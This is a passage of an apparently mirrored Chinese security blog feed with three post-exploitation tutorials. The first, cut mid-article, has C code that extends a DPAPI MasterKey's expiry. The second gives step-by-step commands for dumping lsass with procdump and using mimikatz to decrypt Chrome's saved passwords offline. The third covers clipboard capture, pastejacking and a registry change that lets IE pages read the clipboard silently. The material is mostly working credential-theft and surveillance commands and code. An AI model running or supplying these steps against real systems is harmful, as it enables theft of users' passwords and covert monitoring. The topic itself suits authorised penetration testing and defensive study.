printf(&quot;dwLowDateTime:%08x\n&quot;,ft.dwLowDateTime);    printf(&quot;dwHighDateTime:%08x\n&quot;,ft.dwHighDateTime);    FILE *fp;      fopen_s(&amp;fp,&quot;Preferred&quot;,&quot;rb+&quot;);      fseek(fp,16,SEEK_SET);    fwrite(&amp;ft.dwLowDateTime,sizeof(int),1,fp);    fwrite(&amp;ft.dwHighDateTime,sizeof(int),1,fp);    fclose(fp);    printf(&quot;[+]Change success.\n&quot;);    return 0;  } </code></pre><p>读取Preferred文件，将过期时间设置为<code>2019-12-30 12:30:30</code></p><p>修改后重新读取Preferred文件信息，成功修改，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-3.png" alt="Alt text"></p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文总结了在获得了Windows系统的权限后获得MasterKey的方法，编写程序自动分析Preferred文件格式并延长MasterKey的有效期</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;hr&gt;
&lt;p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码</title>
    <link href="wiki.cfyqy.com/posts/57862677.html"/>
    <id>wiki.cfyqy.com/posts/57862677.html</id>
    <published>2018-05-25T13:03:44.902Z</published>
    <updated>2018-05-25T13:04:28.153Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>曾得出结论：<code>使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码</code>。</p><p>而目前的Windows系统(如Windows Server 2012)，默认无法导出用户的明文口令，只能获得ntlm hash。</p><p>也就是说，即使获得了系统的访问权限，如果无法获得明文口令，通过文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>介绍的方法还是无法离线(但可以在线)导出Chrome浏览器保存的明文密码。</p><p>本文将要介绍一种新方法，利用Masterkey离线导出Chrome浏览器中保存的密码，不需要获得用户的明文口令，并且得出新的结论。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>基础概念</li><li>解密思路</li><li>导出方法</li><li>实际测试</li></ul><h2 id="0x02-基础概念"><a href="#0x02-基础概念" class="headerlink" title="0x02 基础概念"></a>0x02 基础概念</h2><hr><h4 id="DPAPI："><a href="#DPAPI：" class="headerlink" title="DPAPI："></a>DPAPI：</h4><p>全称Data Protection Application Programming Interface</p><h4 id="DPAPI-blob："><a href="#DPAPI-blob：" class="headerlink" title="DPAPI blob："></a>DPAPI blob：</h4><p>一段密文，可使用Master Key对其解密</p><h4 id="Master-Key："><a href="#Master-Key：" class="headerlink" title="Master Key："></a>Master Key：</h4><p>64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p><h4 id="Master-Key-file："><a href="#Master-Key-file：" class="headerlink" title="Master Key file："></a>Master Key file：</h4><p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p><h2 id="0x03-DPAPI解密思路"><a href="#0x03-DPAPI解密思路" class="headerlink" title="0x03 DPAPI解密思路"></a>0x03 DPAPI解密思路</h2><hr><h3 id="1、定位加密的Master-Key-file"><a href="#1、定位加密的Master-Key-file" class="headerlink" title="1、定位加密的Master Key file"></a>1、定位加密的Master Key file</h3><p>文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>曾得出结论：<code>无法定位解密Chrome数据库对应的Master Key file</code></p><p>该结论有误，实际上能够对其定位，方法见0x04</p><h3 id="2、从lsass进程提取出Master-Key"><a href="#2、从lsass进程提取出Master-Key" class="headerlink" title="2、从lsass进程提取出Master Key"></a>2、从lsass进程提取出Master Key</h3><p>此处换了一种思路，因此不需要用户的明文口令</p><p><strong>注：</strong></p><p>离线从Master Key file提取出Master Key，必须要获得用户的明文口令</p><h3 id="3、使用Master-Key解密DPAPI-blob，获得明文"><a href="#3、使用Master-Key解密DPAPI-blob，获得明文" class="headerlink" title="3、使用Master Key解密DPAPI blob，获得明文"></a>3、使用Master Key解密DPAPI blob，获得明文</h3><h2 id="0x04-实现方法"><a href="#0x04-实现方法" class="headerlink" title="0x04 实现方法"></a>0x04 实现方法</h2><hr><p>测试系统：</p><p>Win7 x86</p><h3 id="1、使用python读取数据库文件并提取出密文"><a href="#1、使用python读取数据库文件并提取出密文" class="headerlink" title="1、使用python读取数据库文件并提取出密文"></a>1、使用python读取数据库文件并提取出密文</h3><p>使用python脚本读取Login Data并保存到文件中，代码如下：</p><pre><code>from os import getenvimport sqlite3import binasciiconn = sqlite3.connect(&quot;Login Data&quot;)cursor = conn.cursor()cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;)for result in cursor.fetchall():    print (binascii.b2a_hex(result[2]))    f = open(&#39;test.txt&#39;, &#39;wb&#39;)    f.write(result[2])    f.close()</code></pre><p>脚本执行后，提取Login Data中保存的密文，保存为test.txt</p><h3 id="2、获得该密文对应的Master-Key-file"><a href="#2、获得该密文对应的Master-Key-file" class="headerlink" title="2、获得该密文对应的Master Key file"></a>2、获得该密文对应的Master Key file</h3><p>mimikatz命令如下：</p><pre><code>dpapi::blob /in:test.txt</code></pre><p>获得对应guidMasterkey为<code>{a111b0f6-b4d7-40c8-b536-672a8288b958}</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-1.png" alt="Alt text"></p><p>即Master Key file的路径为<code>%APPDATA%\Microsoft\Protect\%SID%\a111b0f6-b4d7-40c8-b536-672a8288b958</code></p><h3 id="3、从lsass进程提取出Master-Key"><a href="#3、从lsass进程提取出Master-Key" class="headerlink" title="3、从lsass进程提取出Master Key"></a>3、从lsass进程提取出Master Key</h3><h4 id="1-在线方式"><a href="#1-在线方式" class="headerlink" title="(1) 在线方式"></a>(1) 在线方式</h4><p>需要管理员权限</p><p>mimikatz:</p><pre><code>privilege::debugsekurlsa::dpapi</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-2.png" alt="Alt text"></p><p>提取出Master Key为<code>666638cbaea3b7cf1dc55688f939e50ea1002cded954a1d17d5fe0fbc90b7dd34677ac148af1f32caf828fdf7234bafbe14b39791b3d7e587176576d39c3fa70</code></p><h4 id="2-离线方式"><a href="#2-离线方式" class="headerlink" title="(2) 离线方式"></a>(2) 离线方式</h4><p>使用procdump dump出LSASS进程内存</p><p>procdump下载地址：</p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><p>管理员权限：</p><pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>使用mimikatz加载dmp文件：</p><pre><code>sekurlsa::minidump lsass.dmpsekurlsa::dpapi</code></pre><p><strong>注：</strong></p><p>mimikatz从lsass进程提取出Master Key后，会自动将Master Key加入系统缓存</p><h3 id="4、使用masterkey解密"><a href="#4、使用masterkey解密" class="headerlink" title="4、使用masterkey解密"></a>4、使用masterkey解密</h3><p>mimikatz:</p><pre><code>dpapi::blob /in test.txt</code></pre><p>成功获得明文，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-3.png" alt="Alt text"></p><p>数据正确，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-4.png" alt="Alt text"></p><h2 id="0x05-利用分析"><a href="#0x05-利用分析" class="headerlink" title="0x05 利用分析"></a>0x05 利用分析</h2><hr><p>本文介绍的方法是利用lsass进程还原出Master Key，因此不需要获取到用户的明文密码</p><p>同时，配合procdump，不需要在测试系统上执行mimikatz，只需要获得目标系统的两个文件：lsass进程的dmp文件和Login Data文件，在本地使用mimikatz还原出Master Key，解密获得明文</p><p>并且，不需要从System权限降权到当前用户权限</p><p>综上，离线导出的完整思路如下：</p><h4 id="1、获得用户系统Chrome保存密码的SQLite数据库文件，位于-LocalAppData-Google-Chrome-User-Data-Default-Login-Data"><a href="#1、获得用户系统Chrome保存密码的SQLite数据库文件，位于-LocalAppData-Google-Chrome-User-Data-Default-Login-Data" class="headerlink" title="1、获得用户系统Chrome保存密码的SQLite数据库文件，位于%LocalAppData%\Google\Chrome\User Data\Default\Login Data"></a>1、获得用户系统Chrome保存密码的SQLite数据库文件，位于<code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></h4><h4 id="2、获得lsass进程的内存文件"><a href="#2、获得lsass进程的内存文件" class="headerlink" title="2、获得lsass进程的内存文件"></a>2、获得lsass进程的内存文件</h4><h4 id="3、在本地使用mimikatz提取Master-Key，解密Login-Data获得明文"><a href="#3、在本地使用mimikatz提取Master-Key，解密Login-Data获得明文" class="headerlink" title="3、在本地使用mimikatz提取Master Key，解密Login Data获得明文"></a>3、在本地使用mimikatz提取Master Key，解密Login Data获得明文</h4><h2 id="0x06-最终结论"><a href="#0x06-最终结论" class="headerlink" title="0x06 最终结论"></a>0x06 最终结论</h2><hr><h3 id="1、能够定位Master-Key-file"><a href="#1、能够定位Master-Key-file" class="headerlink" title="1、能够定位Master Key file"></a>1、能够定位Master Key file</h3><p>方法1:</p><p>mimikatz命令：</p><pre><code>dpapi::blob /in:test.txt</code></pre><p>方法2：</p><p>通过读取文件Preferred的前16字节获得对应的Master Key file</p><h3 id="2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码"><a href="#2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码" class="headerlink" title="2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码"></a>2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码</h3><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><hr><p>本文介绍了如何利用Masterkey离线导出Chrome浏览器中保存的密码，相比于之前的方法，更加通用</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧——Windows下剪贴板的利用</title>
    <link href="wiki.cfyqy.com/posts/faa84540.html"/>
    <id>wiki.cfyqy.com/posts/faa84540.html</id>
    <published>2018-05-25T13:03:44.900Z</published>
    <updated>2018-05-25T13:04:28.152Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在Windows系统下，剪贴板是一个常见的功能，这其中有哪些可被利用的地方呢？本文将尝试整理这部分内容</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>写入剪贴板的方法</li><li>读取剪贴板的方法</li><li>利用思路</li></ul><h2 id="0x02-剪贴板简介"><a href="#0x02-剪贴板简介" class="headerlink" title="0x02 剪贴板简介"></a>0x02 剪贴板简介</h2><hr><p>剪贴板是指windows操作系统提供的一个暂存数据和共享数据的模块，可理解为数据中转站</p><p>剪贴板的内容保存在内存中，所以系统重启后，保存的数据丢失</p><p>XP系统支持剪贴板查看器clipbrd.exe(Win7后移除)，可查看剪贴板内容 </p><p>剪贴板查看器clipbrd.exe不需要安装，可直接在其他系统(例如Win7)下使用</p><p>复制数据后，在剪贴板查看器clipbrd.exe中实时显示复制的内容，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-1.png" alt="Alt text"></p><h2 id="0x03-写入剪贴板的方法"><a href="#0x03-写入剪贴板的方法" class="headerlink" title="0x03 写入剪贴板的方法"></a>0x03 写入剪贴板的方法</h2><hr><h3 id="1、Ctrl-C"><a href="#1、Ctrl-C" class="headerlink" title="1、Ctrl+C"></a>1、Ctrl+C</h3><p>复制数据，或者通过快捷键<code>Ctrl+C</code>，数据保存到剪贴板中</p><h3 id="2、cmd下的方法"><a href="#2、cmd下的方法" class="headerlink" title="2、cmd下的方法"></a>2、cmd下的方法</h3><p>将<code>whoami</code>输出的内容复制到剪贴板上：</p><pre><code>whoami|clip</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-2.png" alt="Alt text"></p><p>将<code>11.txt</code>的内容复制到剪贴板上：</p><pre><code>clip&lt;11.txt</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-3.png" alt="Alt text"></p><h3 id="3、程序调用API实现"><a href="#3、程序调用API实现" class="headerlink" title="3、程序调用API实现"></a>3、程序调用API实现</h3><p>c++测试代码如下：</p><pre><code>#include &lt;windows.h&gt;BOOL CopyToClipboard(char* pszData){    if(::OpenClipboard(NULL))    {        ::EmptyClipboard();        HGLOBAL clipbuffer;        char *buffer;        clipbuffer = ::GlobalAlloc(GMEM_DDESHARE, strlen(pszData)+1);        buffer = (char *)::GlobalLock(clipbuffer);        strcpy_s(buffer,strlen(pszData)+1, pszData);        ::GlobalUnlock(clipbuffer);        ::SetClipboardData(CF_TEXT, clipbuffer);        ::CloseClipboard();        return TRUE;    }    return FALSE;}int main(int argc, char* argv[]){    CopyToClipboard(&quot;clipcopydatatest&quot;);    return 0;}</code></pre><p>执行如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/2-4.png" alt="Alt text"></p><h2 id="0x04-读取剪贴板的内容"><a href="#0x04-读取剪贴板的内容" class="headerlink" title="0x04 读取剪贴板的内容"></a>0x04 读取剪贴板的内容</h2><hr><h3 id="1、Ctrl-V"><a href="#1、Ctrl-V" class="headerlink" title="1、Ctrl+V"></a>1、Ctrl+V</h3><p>粘贴数据，或者通过快捷键<code>Ctrl+V</code>，读取剪贴板中保存的数据</p><h3 id="2、读取工具"><a href="#2、读取工具" class="headerlink" title="2、读取工具"></a>2、读取工具</h3><p>剪贴板查看器clipbrd.exe</p><h3 id="3、程序调用API实现-1"><a href="#3、程序调用API实现-1" class="headerlink" title="3、程序调用API实现"></a>3、程序调用API实现</h3><p>c++测试代码如下：</p><pre><code>#include &lt;windows.h&gt;BOOL GetTextFromClipboard(){    if(::OpenClipboard(NULL))    {        HGLOBAL hMem = GetClipboardData(CF_TEXT);        if(NULL != hMem)        {            char* lpStr = (char*)::GlobalLock(hMem);             if(NULL != lpStr)            {                printf(&quot;%s&quot;,lpStr);                ::GlobalUnlock(hMem);            }        }        ::CloseClipboard();        return TRUE;    }    return FALSE;}int main(int argc, char* argv[]){    GetTextFromClipboard();    return 0;}</code></pre><p>成功读取剪贴板内容，执行如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/3-1.png" alt="Alt text"></p><p><strong>注：</strong></p><p>也可以模拟键盘输入<code>Ctrl+V</code>，获得剪贴板内容</p><h2 id="0x05-利用思路"><a href="#0x05-利用思路" class="headerlink" title="0x05 利用思路"></a>0x05 利用思路</h2><hr><h3 id="1、实时捕获剪贴板内容"><a href="#1、实时捕获剪贴板内容" class="headerlink" title="1、实时捕获剪贴板内容"></a>1、实时捕获剪贴板内容</h3><p>渗透测试中，在取得系统控制权限后，会尝试读取用户的剪贴板内容，获得有价值的信息</p><p>而实际利用上，最好能够实时捕获剪贴板的内容，配合键盘记录，能够全面监控用户的登录输入内容</p><p>在程序实现上，可以加一个循环判断，如果剪贴板内容改变，就记录下来</p><h4 id="1-使用c-读取当前系统的剪贴板信息"><a href="#1-使用c-读取当前系统的剪贴板信息" class="headerlink" title="(1) 使用c++读取当前系统的剪贴板信息"></a>(1) 使用c++读取当前系统的剪贴板信息</h4><p>代码参考上节内容，加入循环判断，写入文件的功能，代码暂略</p><h4 id="2-使用powershell读取当前系统的剪贴板信息"><a href="#2-使用powershell读取当前系统的剪贴板信息" class="headerlink" title="(2) 使用powershell读取当前系统的剪贴板信息"></a>(2) 使用powershell读取当前系统的剪贴板信息</h4><p>参考地址：</p><p><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-ClipboardContents.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-ClipboardContents.ps1</a></p><p>测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-1.png" alt="Alt text"></p><h3 id="2、Pastejacking"><a href="#2、Pastejacking" class="headerlink" title="2、Pastejacking"></a>2、Pastejacking</h3><p>用作钓鱼网站，欺骗用户复制网址中的一段内容，劫持copyTextToClipboard事件，在复制的内容中加入恶意代码</p><p>复制内容<code>echo &quot;not evil&quot;</code>，实际剪贴板获得的内容为<code>echo &quot;evil&quot;</code></p><p>测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-2.png" alt="Alt text"></p><h3 id="3、修改配置允许IE浏览器读取剪贴板内容"><a href="#3、修改配置允许IE浏览器读取剪贴板内容" class="headerlink" title="3、修改配置允许IE浏览器读取剪贴板内容"></a>3、修改配置允许IE浏览器读取剪贴板内容</h3><p>页面内容：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;script type=&quot;text/javascript&quot;&gt;var content = clipboardData.getData(&quot;Text&quot;);if (content!=null) {    document.write(content);}else {      document.write(&#39;No text found in clipboard.&#39;);}&lt;/script&gt;&lt;/html&gt;</code></pre><p>用户通过IE浏览器访问，默认情况下会弹框提示是否允许此网页访问剪贴板</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-3.png" alt="Alt text"></p><p>选择<code>允许访问</code>，网页获得剪贴板内容，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-4.png" alt="Alt text"></p><p><strong>注：</strong></p><p>Chrome、Firefox浏览器不允许通过getData访问用户的剪贴板内容</p><p>如果获得了用户系统的权限，可以修改IE配置，允许网页访问剪贴板</p><p>修改方式如下：</p><p><code>Internet选项</code> -&gt; <code>安全</code> -&gt; <code>自定义级别</code></p><p><code>设置</code> -&gt; <code>脚本</code> -&gt; <code>允许对剪贴板进行编程访问</code> -&gt; <code>启用</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-5.png" alt="Alt text"></p><p>对应注册表键值<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3</code>下的<code>1407</code></p><ul><li>0表示允许</li><li>1表示提示</li><li>3表示禁止</li></ul><p>修改注册表设置允许访问剪贴板的命令为：</p><pre><code>REG ADD &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3&quot; /v 1407 /t REG_DWORD /d 00000000 /f</code></pre><p>重启IE浏览器后，配置生效</p><p>访问网页自动获得剪贴板内容，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-1/4-6.png" alt="Alt text"></p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文介绍了Windows系统下剪贴板在渗透测试中的相关利用技巧，通过实例演示后渗透阶段的利用方法</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
</feed>
